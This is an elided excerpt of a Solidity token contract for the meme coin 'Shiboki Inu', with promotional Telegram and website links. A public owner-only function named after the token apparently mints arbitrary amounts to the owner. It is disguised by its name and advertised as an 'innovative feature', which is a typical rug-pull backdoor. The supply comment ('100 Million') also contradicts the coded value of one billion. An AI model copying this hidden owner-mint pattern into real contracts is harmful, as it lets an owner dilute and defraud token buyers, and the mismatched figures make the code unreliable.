...
//
// $ShibokiInu proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/ShibokiinuOfficial
//  📱Website : https://shiboki-inu.tech
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ShibokiInu(uint256 amount) public onlyOwner {
 _ShibokiInu(msg.sender, amount);
    }
    ...
    function _ShibokiInu(address account, uint256 amount) internal virtual {
...
contract $ShibokiInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Shiboki Inu", "SINU") {
     _ShibokiInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}